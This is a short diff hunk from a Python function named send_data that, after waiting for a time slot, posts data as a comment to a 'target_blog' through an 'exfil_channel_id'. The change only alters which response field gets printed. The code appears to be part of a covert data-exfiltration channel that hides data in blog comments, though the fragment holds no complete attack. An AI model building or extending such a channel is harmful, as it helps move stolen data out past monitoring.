@@ -23,7 +23,7 @@ def send_data(data, send_time_slot, confirm_time_slot):
         print("Triggered at: " + str(datetime.datetime.now().time()))
 
         response = submit_comment(target_blog, exfil_channel_id, data)
-        print(response.html_response)
+        print(response.moderation_hash)
 
         if confirm_time_slot:
             delay_to_timeslot(confirm_time_slot)
